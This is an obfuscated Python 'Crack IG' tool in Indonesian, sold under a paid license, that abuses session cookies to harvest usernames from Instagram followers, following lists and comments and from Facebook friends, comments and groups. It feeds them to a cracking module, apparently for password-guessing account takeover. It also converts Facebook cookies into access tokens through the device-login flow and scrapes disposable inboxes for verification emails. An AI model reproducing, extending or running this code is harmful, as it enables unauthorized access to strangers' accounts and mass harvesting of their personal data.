#!/usr/bin/env python
_n='following'
_m='"user_id":"(\\d+)"'
_l=';csrftoken=%s;'
_k='csrf_token'
_j='config'
_i='https://www.instagram.com/data/shared_data/'
_h='csrftoken'
_g=' %s. %s'
_f='\n [ Pilih File Anda ]\n'
_e='center'
_d='purple'
_c='html.parser'
_b='ds_user_id=(\\d+)'
_a='Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'
_Z='%s|%s'
_Y='\r'
_X='data/FB-login.txt'
_W='04'
_V='03'
_U='02'
_T='01'
_S='username'
_R='rm -rf data/IG-login.txt'
_Q='data/IG-login.txt'
_P=False
_O='full_name'
_N='user-agent'
_M=None
_L='name'
_K='a'
_J='user'
_I='data'
_H='cat_rich.py'
_G='cls'
_F='linux'
_E='|'
_D='clear'
_C='w'
_B='cookie'
_A=True
import os,sys,time,requests
from rich.console import Console
from rich.panel import Panel
def CetakBanner(ulfahsadiyah):A=Console(width=100);A.print(Panel(ulfahsadiyah,style=_d),justify=_e)
def whoami(kaya):A=Console(width=100);A.print(Panel(kaya,style=_d),justify=_e)
class Logo:
	def bersihkan_layar(A):
		'Membersihkan layar berdasarkan platform'
		if _F in sys.platform.lower():os.system(_D)
		elif'win'in sys.platform.lower():os.system(_G)
	def logonya(A):'Menampilkan logo';A.bersihkan_layar();B=Console(width=87);B.print(Panel(f"""{U2}╭─────────╮
│ {M2}⬤  {K2}⬤  {H2}⬤ {U2}│ 
{U2}╰─────────╯{B2}
          _____                                                                
       __|___  |__  ____    ______  ______       __   __  ____    __  __  ___  
      |   ___|    ||    \\  |   ___||   ___| ___ |  |_|  ||    \\  |  |/ / |   | 
      |   ___|    ||     \\ |   |__ |   ___||___||   _   ||     \\ |     \\ |   | 
      |___|     __||__|\\__\\|______||______|     |__| |__||__|\\__\\|__|\\__\\|___| 
         |_____|                                                             
""",style=color_panel))
def xoshnaw():
	A=str(os.geteuid())+str(os.getlogin());id='工'.join(A);os.system(_D);whoami(f"[bold cyan]LICENSI KAMU ADALAH [bold white]:[bold white] {id}")
	try:B=requests.get('https://github.com/Gladiator-Xd-stack/Version/blob/main/K.txt').text
	except requests.RequestException as C:whoami('[bold red]ERROR MENGAMBIL DATA DARI SERVER[/bold red]');sys.exit()
	if id in B:whoami('[bold green]HORE LICENSI ANDA SUDAH AKTIF [🥳]');D=str(os.geteuid());time.sleep(.3);return
	whoami('[bold red]LICENSI ANDA TIDAK AKTIF [😡]');whoami('[bold yellow]SILAHKAN COPY ID DI ATAS KIRIM KE AUTHOR [📩]');whoami('[bold green]Whatsapp[bold white] : [bold white] +6282316671302 [bold green][📲]');os.system('xdg-open https://wa.me/+6285767630210?text=BANG+SAYA+MAU+BELI+LICENSI+CRACK+IG+BERAPA+HARGA+NYA+?');time.sleep(1);sys.exit()
if __name__=='__main__':xoshnaw()
Los,xx,un=0,0,[]
Warning='\n\n [!] Jangan Edit Apapun Agar Script Berjalan Dengan Semestinya, terima kasih'
import requests,platform,os,re,time,sys,pytz,json,random,datetime
from bs4 import BeautifulSoup as bsp
from concurrent.futures import ThreadPoolExecutor
from method import Ger_old as Bdt_old
from rich import print as Print
from rich.panel import Panel as Nel
from rich.console import Console
P='\x1b[97m'
I='\x1b[30m'
A='\x1b[90m'
H='\x1b[32m'
K='\x1b[33m'
M,K2=K,K
Tema=[]
Mail=[]
datetim=datetime.datetime.now()
datenow='%s-%s-%s'%(datetim.day,datetim.month,datetim.year)
class MAIN:
	userid=[];pk_idg=[];fauser=[]
	def __init__(A):super(MAIN).__init__()
	def MyRich(A,Text,chos=_M,title=_M):
		B=title
		if os.path.isfile(_H)is _A:import cat_rich as C;A.cat=C.Lylii
		else:A.cat='color(8)'
		if A.cat not in Tema:Tema.append(A.cat)
		if chos:Console(width=62).print(Nel(Text,subtitle='┌─',subtitle_align='left',style=A.cat,title=B))
		else:Console(width=62).print(Nel(Text,style=A.cat,title=B))
	def Me(A):A.MyRich('[yellow] \n╔═╗┬─┐┌─┐┌─┐┬┌─   ╦┌─┐\n║  ├┬┘├─┤│  ├┴┐───║│ ┬\n╚═╝┴└─┴ ┴└─┘┴ ┴   ╩└─┘\n')
	def find_res(A,meki=[]):
		D=meki
		try:
			A.file=os.listdir(_I);A.dihi=0;print(_f)
			for A.su in A.file:
				if'ok'not in A.su.lower()or'cp'in A.su.lower():0
				else:A.dihi+=1;print(_g%(A.dihi,A.su))
			A.name=input('\n Masukan nama file : ')
		except Exception as E:exit(E)
		for F in open(f"data/{A.name}",'r').read().splitlines():
			B=re.findall('ds_user_id=(.*)',str(F))
			if len(B)==0:continue
			elif B not in D:D.append('ds_user_id=%s'%B[0])
		if len(D)==0:exit(f"\nTidak Bisa menemukan cokie!")
		else:
			for C in D:
				try:print(f"\n Mencoba: {H}{C}{P}");B={_N:_a};G=re.search(_b,str(C)).group(1);I=requests.get(f"https://i.instagram.com/api/v1/users/{G}/info/",headers=B,cookies={_B:C}).json()[_J][_O];open(_Q,_C).write(f"{C}");print(f"\n {P}Login sebagai : {H}{I}");time.sleep(2);os.system(_D if sys.platform.lower()==_F else _G);A.insta()
				except Exception as E:print(f"\n{P} Expired: {K}{C}")
	def aset_ig(A):
		os.system(_D if sys.platform.lower()==_F else _G)
		if os.path.isfile(_Q)is _A:A.coki={_B:open(_Q,'r').read()}
		else:
			os.system(_D if sys.platform.lower()==_F else _G);A.Me();A.MyRich('[white]Masukan Cokie Anda',_A);A.momo={_B:Console(style=Tema[0]).input(f"   └──> ")}
			if A.momo[_B]=='res':A.coki={_B:A.find_res()}
			else:A.coki=A.momo
		try:C={_N:_a};E=requests.get('https://www.instagram.com/api/v1/tags/web_info/?tag_name=khmd',headers=C,cookies=A.coki).json();D=re.search(_b,str(A.coki[_B])).group(1);B=requests.get(f"https://i.instagram.com/api/v1/users/{D}/info/",headers=C,cookies=A.coki).json()[_J];open(_Q,_C).write(f"{A.coki[_B]}")
		except:os.system(_R);print('\nInvalid cookie');exit()
		os.system(_D if sys.platform.lower()==_F else _G);return A.coki,B[_O],B['follower_count'],B[_S]
	def insta(A):
		os.system(_D if sys.platform.lower()==_F else _G);A.aset,A.nama,A.fol,A.usr=A.aset_ig();A.Me();A.Os=_A
		if A.Os is _A:A.username='Mem';A.join='Banyak Dosa';A.expired='Permanen';A.status='Anak Emas'
		else:A.validasi=ApiKey.UserKey().konfirkeys();A.username=A.validasi.split(_E)[0];A.join=A.validasi.split(_E)[1];A.expired=str(A.validasi.split(_E)[2])+str(' Hari');A.status='Premium'
		if len(A.nama)>11:A.nama=A.nama[:11]
		A.ds_user=re.search(_b,str(A.aset)).group(1);A.MyRich(' [white]01. Crack Dari Followers    03. Crack Dari Komentar\n 02. Crack Dari Following    04. Crack Unlimited Followers\n 05. Ganti Akun Tumbal       06. WhatsApp Admin',_A);A.chs(A.aset)
	def chs(A,assets):
		C=assets
		while _A:
			B=Console(style=Tema[0]).input(f"   └──> ")
			if B in[_T,'1']:A.dumps(C,_A)
			elif B in[_U,'2']:A.dumps(C,_P)
			elif B in[_V,'3']:A.komentar(C)
			elif B in[_W,'4']:A.Unli(C)
			elif B in['06','6']:exit(os.system('xdg-open https://wa.me/+6285767630210?text='))
			elif B in['5']:os.system(_R);A.insta()
			elif B in['12']:
				if os.path.isfile(_X)is _P:exit(A.MyRich(f"[white]Untuk Menggunakan Fitur Ini Anda Harus Jalankan Dengan Memasukan Perintah Di Bawah Ini\n\n\t    [bold green]python {sys.argv[0]} FACEBOOK=True[/]\n\n\tSalin Text Di Atas Untuk Mempercepat!"))
				else:
					try:A.cokie,A.token=open(_X,'r').read().split(_E);A.req=requests.post('https://graph.facebook.com/me?batch=[{"method":"get","relative_url":"me"}]&include_headers=false&access_token=%s'%A.token,cookies={_B:A.cokie}).json();A.res=json.loads(A.req[0]['body']);A.ttl=A.res['birthday'];A.uid=A.res['id'];A.lam=A.Gender(A.res['gender']);A.nam=A.res[_L];A.MyRich(f"""[white]
 >> Nama Users : {A.nam}
 >> Gender     : {A.lam}
 >> BirthDay   : {A.ttl}
 >> UserID     : {A.uid}
""",_M,'[white]> [green]DETAIL USER[/] <')
					except(KeyError,Exception):exit('\nMembutuhkan cookie baru!')
				A.Facebook(cookies=A.cokie,token=A.token)
			elif B in['11']:
				A.MyRich('[white]Masukan Kata Kunci Untuk Pencarian Email, Misalnya : good,boy,girl kata kunci dengan menggunakan bahasa inggris akan cepat mendapatkan email!',_A);A.Target=Console(style=Tema[0]).input(f"   └──> ").replace(' ','').split(',');A.MyRich('[white] 01. Tampilkan Hanya Email Dari Facebook\n 02. Tampilkan Hanya Email Dari Instagram\n 03. Tampilkan Hanya Email Dari Tiktok\n 04. Tampilkan Hanya Email Dari Twitter\n 05. Tampilkan Semua Tidak Di Filter',_A);A.fil=Console(style=Tema[0]).input(f"   └──> ")
				if A.fil in['1',_T]:filter='fb'
				elif A.fil in['2',_U]:filter='ig'
				elif A.fil in['3',_V]:filter='tk'
				elif A.fil in['4',_W]:filter='tw'
				elif A.fil in['5','05']:filter='ls'
				else:filter='ls'
				A.CariNama(A.Target,filter)
	def CariNama(A,Items,Fil):
		B=Items;A.MyRich(f"[white]Proses Sedang Di Mulai! Email Yang Tersedia Akun [Tiktok,Facebook,Instagram,Twitter] Akan Di Simpan Di Dalam Folder [green]data/email/Email-{datenow}[/] Nikamati Semua Fiture Yang Saya Berikan:)");A.bef=[];print('')
		with ThreadPoolExecutor(max_workers=3)as C:
			for A.e in B:C.submit(A.FindMesage,A.e,A.bef,Fil)
		if len(A.bef)!=0:exit(f"\nSelamat Kamu Mendapatkan {len(A.bef)} Email\nKata Kunci {B}")
		else:exit('\nGunakan Kata Kunci Yang Lain!')
	def FindMesage(A,user,duplikat,filters):
		K='twitter';J='facebook';I='tiktok';H='instagram';G='\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n';F='\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n';E='@';D='https://inboxkitten.com/inbox/%s/list';C=filters;B=duplikat;global Los
		try:
			A.req=requests.get(f"https://inboxkitten.com/api/v1/mail/list?recipient={user}").json()
			for A.mes in A.req:
				A.sender=re.findall("'sender': '(.*?)'",str(A.mes));A.alamat=re.findall("'recipient': '(.*?)'",str(A.mes))
				if str(C)=='ls':
					if H in str(A.sender[0].lower())or J in str(A.sender[0].lower())or H in str(A.sender[0].lower())or I in str(A.sender[0].lower())or I in str(A.sender[0].lower())or K in str(A.sender[0].lower()):
						if A.alamat[0]not in B:A.url=D%A.alamat[0].split(E)[0];print(F%(str(A.sender[0].lower()),A.alamat[0],A.url));B.append(A.alamat[0]);open(f"data/email/EmailAcak-{datenow}",_K).write(G%(str(A.sender[0].lower()),A.alamat[0],A.url))
					else:Los+=1
				elif C=='ig':
					if H in str(A.sender[0].lower()):
						if A.alamat[0]not in B:A.url=D%A.alamat[0].split(E)[0];print(F%(str(A.sender[0].lower()),A.alamat[0],A.url));open(f"data/email/EmailInstagram-{datenow}",_K).write(G%(str(A.sender[0].lower()),A.alamat[0],A.url));open('tes.json',_K).write(f"{A.alamat[0]}\n");B.append(A.alamat[0])
					else:Los+=1
				elif str(C)=='tk':
					if I in str(A.sender[0].lower()):
						if A.alamat[0]not in B:A.url=D%A.alamat[0].split(E)[0];print(F%(str(A.sender[0].lower()),A.alamat[0],A.url));open(f"data/email/EmailTiktok-{datenow}",_K).write(G%(str(A.sender[0].lower()),A.alamat[0],A.url));B.append(A.alamat[0])
					else:Los+=1
				elif str(C)=='tw':
					if K in str(A.sender[0].lower()):
						if A.alamat[0]not in B:A.url=D%A.alamat[0].split(E)[0];print(F%(str(A.sender[0].lower()),A.alamat[0],A.url));open(f"data/email/EmailTwitter-{datenow}",_K).write(G%(str(A.sender[0].lower()),A.alamat[0],A.url));B.append(A.alamat[0])
					else:Los+=1
				elif str(C)=='fb':
					if J in str(A.sender[0].lower()):
						if A.alamat[0]not in B:A.url=D%A.alamat[0].split(E)[0];print(F%(str(A.sender[0].lower()),A.alamat[0],A.url));open(f"data/email/EmailFacebook-{datenow}",_K).write(G%(str(A.sender[0].lower()),A.alamat[0],A.url));B.append(A.alamat[0])
					else:Los+=1
			print(f"Success: {len(B)} Skip: {Los}",end=_Y)
		except:pass
	def Facebook(A,**C):
		A.token=str(C['token']);A.cokie=str(C['cookies']);A.MyRich('[white] 01. Crack Dari Teman           06. Check Hasil Crack\n 02. Crack Dari Komentar        07. Crack Ulang Akun CP\n 03. Crack Dari Anggota Group   08. Check Opsi Akun CP\n 04. Crack Dari Pencarian Nama  09. Ganti Akun Tumbal\n 05. Crack Dari Random Email    10. Kembali',_A)
		while _A:
			B=Console(style=Tema[0]).input(f"   └──> ")
			if B in[_T,'1']:A.TemanFb(A.cokie,A.token)
			elif B in[_U,'2']:A.KomentarFb(A.cokie)
			elif B in[_V,'3']:A.AnggotaGroup(A.cokie)
			elif B in[_W,'4']:A.PencarianNamaFb(A.cokie)
			elif B in['05','5']:A.RandomEmail()
			elif B in['06','6']:A.HasilFb()
			elif B in['07','7']:A.CrackUlangFb()
			elif B in['08','8']:A.CekOpsi()
			elif B in['09','9']:os.system('rm -rfdata/FB-login.txt');A.insta()
			elif B in['10']:A.insta()
	def TemanFb(A,cokie,token):
		A.MyRich('[white]Masukan ID Target Gunakan Tanda Koma Sebagai Pemisah (,)',_A);A.ab=Console(style=Tema[0]).input(f"   └──> ").split(',')
		with ThreadPoolExecutor(max_workers=2)as B:
			for A.id in A.ab:B.submit(A.DumpTeman,A.id,cokie,token)
	def DumpTeman(A,user,cokie,token):
		with requests.Session()as A.r:
			try:
				A.req=A.r.get('https://graph.facebook.com/%s?fields=friends&access_token=%s'%(user,token),cookies={_B:cokie}).json()['friends'][_I]
				for A.apc in A.req:
					A.mat=_Z%(A.apc[_L],A.apc['id'])
					if A.mat not in A.fauser:A.fauser.append(A.mat)
			except:pass
	def KomentarFb(A,cokie):A.MyRich('[white]Masukan link postingan Pastikan Target Bersifat Publik [Group,Post Teman]',_A);A.link=Console(style=Tema[0]).input(f"   └──> ");A.host=A.link.split('//')[1].split('/')[0];A.repl=A.link.replace(A.host,'mbasic.facebook.com');A.DumpKomen(A.repl,cokie)
	def DumpKomen(A,curl,cokie):
		B=cokie
		with requests.Session()as A.r:
			try:
				A.req=A.r.get(curl,cookies={_B:B}).text;A.data=re.findall('<h3><a class=".*?" href="(.*?)">(.*?)</a></h3>',str(A.req))
				for A.apc in A.data:
					if'/profile.php?'in A.apc[0]:
						A.id,A.nama=re.search('id=(.*?)&',str(A.apc[0])).group(1),A.apc[1];A.mat=_Z%(A.nama,A.id);print(A.mat)
						if A.mat not in A.fauser:A.fauser.append(A.mat)
					else:
						A.username,A.nama=re.search('/(.*?)?eav',str(A.apc[0])).group(1),A.apc[1];A.mat=_Z%(A.nama,A.username.split('?')[0]);print(A.mat)
						if A.mat not in A.fauser:A.fauser.append(A.mat)
				for A.link in bsp(A.req,_c).find_all(_K,href=_A):
					if'Lihat komentar lainnya…'in str(A.link.text):A.DumpKomen(A.link['href'],B)
					else:continue
			except:pass
	def Gender(A,xxxx):return'Laki-Laki'if xxxx.lower()=='male'else'Perempuan'
	def theme(B):
		B.MyRich('[white] 01. Set Tema Hijau          04. Set Tema Putih\n 02. Set Tema Merah          05. Set Tema Ungu\n 03. Set Tema Biru           06. Set Tema Kuning\n 07. Set Tema Default',_A)
		while _A:
			A=Console(style=Tema[0]).input(f"   └──> ")
			if A in[_T,'1']:open(_H,_C).write("Lylii = 'color(10)'")
			elif A in[_U,'2']:open(_H,_C).write("Lylii = 'color(9)'")
			elif A in[_V,'3']:open(_H,_C).write("Lylii = 'color(4)'")
			elif A in[_W,'4']:open(_H,_C).write("Lylii = 'color(7)'")
			elif A in['05','5']:open(_H,_C).write("Lylii = 'color(5)'")
			elif A in['06','6']:open(_H,_C).write("Lylii = 'color(3)'")
			elif A in['07','7']:open(_H,_C).write("Lylii = 'color(8)'")
			exit(os.system(f"python {sys.argv[0]}"))
	def save_sd(A,col=[]):
		B='\nDone'
		try:
			A.file=os.listdir(_I);A.hitg=0;print(_f)
			for A.su in A.file:
				A.xy=A.su.split('Instagram')
				if len(A.xy)<2:0
				else:A.hitg+=1;col.append(A.su);print(_g%(A.hitg,A.su))
			print('');A.MyRich('[white]Ketik [green]all[/] Untuk Menyimpan Semua Hasil Crack Anda Ke sdcard OnTap. Masukan nama file jika ingin menyimpan salah satu',_A);A.name=Console(style=Tema[0]).input(f"   └──> ")
			if A.name in('all','All'):
				for A.xyz in col:os.system(f"cp data/{A.xyz} /sdcard")
				exit(B)
			else:os.system(f"cp data/{A.name} /sdcard");exit(B)
		except Exception as C:exit(C)
	def komentar(A,cokie,dav=[]):
		B=cokie;A.MyRich('[white]Masukan link postingan atau reels. pisahkan dengan koma',_A);C=Console(style=Tema[0]).input(f"   └──> ").split(',')
		try:
			for D in C:A.r=requests.get(D,cookies=B).text;A.o=re.search('"media_id":"(\\d+)"',str(A.r)).group(1);dav.append(A.o)
			for A.x in dav:A.dump_komen(B,A.x,'')
		except:pass
		A.ToolsType()
	def dump_komen(A,cokie,uid,min):
		D='next_min_id';C=cokie;B=uid;global xx
		try:
			A.r=requests.get(f"https://i.instagram.com/api/v1/media/{B}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min}",cookies=C,headers={_N:_a}).json()
			for A.i in A.r['comments']:
				A.a=A.i[_J][_S]+_E+A.i[_J][_O]
				if A.a not in A.pk_idg:A.pk_idg.append(A.a);xx+=1;Console(style=Tema[0]).print(f"   └──> Berhasil dump [green]{xx}[/] id [white]{B}[/]",end=_Y)
			if D in str(A.r):A.dump_komen(C,B,A.r[D])
		except:pass
	def Unli(A,cokie):
		B=cokie
		if _h not in str(B[_B]):
			try:A.memek=requests.get(_i,cookies=B).json();A.token=A.memek[_j][_k];B[_B]+=_l%A.token
			except Exception as C:os.system(_R);exit(f"\n{P}[{K}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {C}")
		A.MyRich('[white]Masukan username akun instagram Pastikan (Target Memiliki Followers, Akun Bersifat Publik, Tidak Centang Biru)[/]',_A);A.user=Console(style=Tema[0]).input(f"   └──> ")
		try:D=requests.get(f"https://www.instagram.com/{A.user}/",cookies=B).text;E=re.search(_m,str(D)).group(1);A.Exekusi(E,B,'',_A,_A)
		except:pass
		if len(un)>0:
			A.MyRich('[white]Matikan data/wifi jika anda ingin stop dump!. jangan gunakan [red]CTRL + C[/]')
			for A.momok in un:A.Graphql(_A,A.momok,B[_B],'')
		else:exit('\nGanti Username/Tumbal!')
		A.ToolsType()
	def igrst(A):
		print('');A.dirs=os.listdir(_I);A.index=0
		for A.name in A.dirs:
			if'-'not in A.name or'login'in A.name:0
			else:A.index+=1;print(' %s. data/%s'%(A.index,A.name))
		print('');A.MyRich('[white]Masukan Nama File Untuk Melihat Hasil, Gunakan koma untuk pemisahan nama file',_A);A.file=Console(style=Tema[0]).input(f"   └──> ").split(',')
		for A.bx in A.file:
			for A.xv in open(A.bx,'r').read().splitlines():print(' %s\n'%A.xv)
		exit()
	def Ulang(A):
		try:
			B=os.listdir(_I);C=0
			if len(B)==0:exit(f"\n{P}[{M}!{P}] File Tidak Ada")
			print('')
			for D in B:
				if'CP'not in str(D):0
				else:C+=1;print(f" {C}. {D}")
			print('');A.MyRich('[white]Masukan Nama file. Jangan Angkanya contoh: CP/Example.txt',_A);F=Console(style=Tema[0]).input(f"   └──> ")
			for E in open(f"data/{F}",'r').read().splitlines():G,H=E.split(_E)[0],E.split(_E)[1];A.pk_idg.append(f"{G}|{H}");Console(style=Tema[0]).print(f"   └──> Berhasil dump [green]{len(A.pk_idg)}[/]",end=_Y)
		except(FileNotFoundError,ValueError):exit('\nFile Tidak Ada Atau Pemisahan Salah.')
		A.ToolsType()
	def dumps(A,cintil,typess,xyz=[]):
		D=typess;C=xyz;B=cintil
		if _h not in str(B[_B]):
			try:A.memek=requests.get(_i,cookies=B).json();A.token=A.memek[_j][_k];B[_B]+=_l%A.token
			except Exception as G:os.system(_R);exit(f"\n{P}[{K}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {G}")
		A.MyRich('[white]Masukan Username Target Dibawah[/]',_A);H=Console(style=Tema[0]).input(f"   └──> ").split(',')
		try:
			for A.y in H:
				I=requests.get(f"https://www.instagram.com/{A.y}/",cookies=B).text;E=re.search(_m,str(I)).group(1)
				if E not in C:C.append(E)
		except:pass
		try:
			J='followers'if D is _A else _n
			for F in C:
				if D is _A:A.Graphql(_A,F,B[_B],'')
				else:A.Graphql(_P,F,B[_B],'')
		except:exit(A.ToolsType())
		exit(A.ToolsType())
	def Exekusi(A,uid,cokie,next,mode,unli=_M):
		F='next_max_id';D=uid;B=cokie;global xx;E={'Host':'www.instagram.com','x-requested-with':'XMLHttpRequest','x-csrftoken':re.search('csrftoken=(.*?);',str(B[_B])).group(1),'x-ig-app-id':'1217981644879628',_N:'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'};G={'count':'12','search_surface':'follow_list_page','max_id':next}
		if mode==_n:C=requests.get(f"https://www.instagram.com/api/v1/friendships/{D}/following/?count=12&max_id={next}",cookies=B,headers=E).json()
		else:C=requests.get(f"https://www.instagram.com/api/v1/friendships/{D}/followers/",params=G,cookies=B,headers=E).json()
		for A.mmk in C['users']:
			xx+=1;A.xy=A.mmk[_S]+_E+A.mmk[_O]
			if A.xy not in A.pk_idg:
				if unli is _M:A.pk_idg.append(A.xy)
				else:
					A.zc=A.mmk['pk'];un.append(A.zc)
					if len(un)==5:break
		if F in str(C):A.Exekusi(D,B,C[F],mode)
	def Graphql(A,typess,userid,cokie,after):
		F='page_info';E='node';D=cokie;C=userid;B=typess;global xx;A.api='https://www.instagram.com/graphql/query/';A.csr='variables={"id":"%s","first":24,"after":"%s"}'%(C,after);A.mek='query_hash=58712303d941c6855d4e888c5f0cd22f&{}'.format(A.csr)if B is _P else'query_hash=37479f2b8209594dde7facb0d904896a&{}'.format(A.csr)
		try:
			A.ptk={_N:'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',_B:D};A.req=requests.get(A.api,params=A.mek,headers=A.ptk).json()
			if'require_login'in A.req:
				if len(A.pk_idg)>0:0
				else:exit(f"\n{P}Invalid Cookie")
			A.khm='edge_followed_by'if B is _A else'edge_follow'
			for A.xyz in A.req[_I][_J][A.khm]['edges']:
				A.xy=A.xyz[E][_S]+_E+A.xyz[E][_O]
				if A.xy not in A.pk_idg:xx+=1;A.pk_idg.append(A.xy);Console(style=Tema[0]).print(f"   └──> Berhasil dump [green]{xx}[/] id [white]{C}[/]",end=_Y)
			A.end=A.req[_I][_J][A.khm][F]['has_next_page']
			if A.end is _A:A.after=A.req[_I][_J][A.khm][F]['end_cursor'];A.Graphql(B,C,D,A.after)
			else:0
		except:return 1
	def ToolsType(A):exit(Bdt_old.MAIN().List(A.pk_idg))
class MainDev:
	def __init__(A):A.data,A.host={},'https://m.facebook.com';A.token_app='1348564698517390|007c0a9101b9e1c8ffab727666805038'
	def Run(A):
		if len(sys.argv)==2:
			if sys.argv[1].split('=')[1]=='True':
				if os.path.isfile(_X)is _P:
					A.ok=_A
					while A.ok:
						A.ok=A.GetingCode(input('FBcookie: '))
						if'EAAT'in str(A.ok):break
					os.system(_D if sys.platform.lower()==_F else _G);print('Login Berhasil, Fiture Facebook Sekarang Bisa Di Gunakan.');os.system(_D if sys.platform.lower()==_F else _G);time.sleep(2);MAIN().insta()
				else:MAIN().insta()
		else:MAIN().insta()
	def GetingCode(A,coki):
		I='action';H='post';G='form';F='value';E='input';D='user_code';B=coki
		with requests.Session()as C:
			try:
				A.r=C.post(f"https://graph.facebook.com/v2.6/device/login?access_token={A.token_app}").json();A.user_code,A.code=A.r[D],A.r['code'];A.r1=bsp(C.get(f"https://m.facebook.com/device?user_code={A.user_code}",cookies={_B:B}).text,_c);A.ls=['fb_dtsg','jazoest','qr']
				for A.i in A.r1.find_all(E):
					if A.i.get(_L)in A.ls:A.data.update({A.i[_L]:A.i[F]})
				A.data.update({D:A.user_code});A.ul=A.r1.find(G,method=H)[I];A.r2=bsp(C.post(A.host+A.ul,data=A.data,cookies={_B:B}).text,_c);A.data.clear()
				for A.a in A.r2.find_all(E):
					if A.a.get(_L)=='__CANCEL__':0
					else:A.data.update({A.a.get(_L,'submit'):A.a.get(F)})
				A.r3=C.post(A.host+A.r2.find(G,method=H)[I],data=A.data,cookies={_B:B}).text;A.r4=C.post(f"https://graph.facebook.com/v2.6/device/login_status?access_token={A.token_app}&code={A.code}",cookies={_B:B}).json()['access_token'];A.rt=_Z%(B,A.r4);open(_X,_C).write(A.rt);return A.r4
			except(KeyError,Exception):return _A
MainDev().Run()